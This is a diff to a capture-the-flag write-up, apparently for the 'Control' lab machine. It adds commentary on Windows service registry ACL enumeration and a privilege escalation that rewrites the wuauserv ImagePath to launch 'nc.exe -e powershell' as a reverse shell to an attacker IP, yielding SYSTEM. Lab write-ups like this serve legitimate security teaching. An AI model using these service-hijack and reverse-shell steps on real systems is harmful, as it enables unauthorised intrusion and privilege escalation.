@@ -418,6 +418,14 @@ get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
 get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
 ```
 
+The first command shows the content of `HKLM:\SYSTEM\CurrentControlset`.<br>
+It contains the following 6 keys.
+1. Control: Windows Configuration e.g. system startup and some aspects of device configuration
+2. Enum: Hardware config
+3. Hardware profiles:
+4. Policies:
+5. Services: Windows services list
+6. Software: 
 ```shell
 PS C:\Users\Hector\Documents> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
 get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
@@ -502,7 +510,8 @@ ValueCount    : 0
 Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
 ```
 
-
+Then, try to get the access the permission of this registry tree.<br>
+We can find SDDL (Security Descriptor Definition Language) as well, but it's a pain in a back to read.
 ```shell
 PS C:\> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
 get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
@@ -534,28 +543,86 @@ Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(
          -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
 ```
 
+Using the following command, we can make the SDDL readable for humans.<br>
+It shows that `Control\Hector` has `FullControl` permission.
+```
+PS C:\Users\Hector\Documents> $acl = get-acl HKLM:\System\CurrentControlSet\Services
+$acl = get-acl HKLM:\System\CurrentControlSet\Services
+PS C:\Users\Hector\Documents> ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights
+ConvertFrom-SddlString -Sddl $acl.Sddl -type RegistryRights
+
+
+Owner            : NT AUTHORITY\SYSTEM
+Group            : NT AUTHORITY\SYSTEM
+DiscretionaryAcl : {NT AUTHORITY\Authenticated Users: AccessAllowed (EnumerateSubKeys, ExecuteKey, Notify, 
+                   QueryValues, ReadPermissions), NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateLink, 
+                   CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, 
+                   Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey), BUILTIN\Administrators: 
+                   AccessAllowed (ChangePermissions, CreateLink, CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, 
+                   FullControl, GenericExecute, GenericWrite, Notify, QueryValues, ReadPermissions, SetValue, 
+                   TakeOwnership, WriteKey), CONTROL\Hector: AccessAllowed (ChangePermissions, CreateLink, 
+                   CreateSubKey, Delete, EnumerateSubKeys, ExecuteKey, FullControl, GenericExecute, GenericWrite, 
+                   Notify, QueryValues, ReadPermissions, SetValue, TakeOwnership, WriteKey)...}
+SystemAcl        : {}
+RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
+```
+
+After that, try to find if really `Control\Hector` has permission for services.<br>
+As the following result shows, we have over 3000 `FullControl` access for all entries (services).
+```
+PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "Hector Users Path Everyone"
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List *| findstr /i "Hector Users Path"
+PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
+Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+                          NT AUTHORITY\Authenticated Users Allow  ReadKey
+                          CONTROL\Hector Allow  FullControl
+PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
+Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+                          NT AUTHORITY\Authenticated Users Allow  ReadKey
+                          CONTROL\Hector Allow  FullControl
+PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services
+Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\.NET
+                          NT AUTHORITY\Authenticated Users Allow  ReadKey
+                          CONTROL\Hector Allow  FullControl
+
+---
+
+```
+```
+PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | measure
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | measure
+
+
+Count    : 3427
+Average  : 
+Sum      : 
+Maximum  : 
+Minimum  : 
+Property : 
+```
+
+We can confirm that `Hector\Control` has permission for `wuau` (Windows update) as well.
+```
+PS C:\Users\Hector\Documents> get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | findstr /i "wuau"
+get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "hector Users Path Everyone" | findstr /i "wuau"
+PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau
+Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau
+```
+
+Plan to get a reverse shell as `NT AUTHORITY\SYSTEM`.<br>
+First, launch a netcat listener on port 4445.
 ```shell
-root@kali:~# python -m SimpleHTTPServer 
-Serving HTTP on 0.0.0.0 port 8000 ...
+root@kali:~# nc -nlvp 4445
+listening on [any] 4445 ...
 
 ```
 
-```shell
-PS C:\Users\Hector\Documents> wget http://10.10.14.42:8000/accesschk.exe -O accesschk.exe
-wget http://10.10.14.42:8000/accesschk.exe -O accesschk.exe
-PS C:\Users\Hector\Documents> ls
-ls
-
-
-    Directory: C:\Users\Hector\Documents
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----        8/23/2020   6:19 AM         792208 accesschk.exe
-
-```
-
+Since we've uploaded `nc.exe` already, we can use the following command.<br>
+Edit the `ImagePath` attribute of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wuau`.<br>
+To start the service, we need to run `Start-Service wuauserv`.
 ```shell
 PS C:\> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\inetpub\wwwroot\nc.exe -e powershell 10.10.14.42 4445" /f
 reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\inetpub\wwwroot\nc.exe -e powershell 10.10.14.42 4445" /f
@@ -563,7 +630,7 @@ The operation completed successfully.
 PS C:\> Start-Service wuauserv
 ```
 
-
+Now we got a reverse shell as `NT AUTHORITY\SYSTEM`.
 ```shell
 root@kali:~# nc -nlvp 4445
 listening on [any] 4445 ...
@@ -576,7 +643,7 @@ whoami
 nt authority\system
 ```
 
-
+As always, `root.txt` is in the directory `C:\Users\Administrator\Desktop\`.
 ```shell
 PS C:\Windows\system32> cat C:\users\administrator\desktop\root.txt
 cat C:\users\administrator\desktop\root.txt
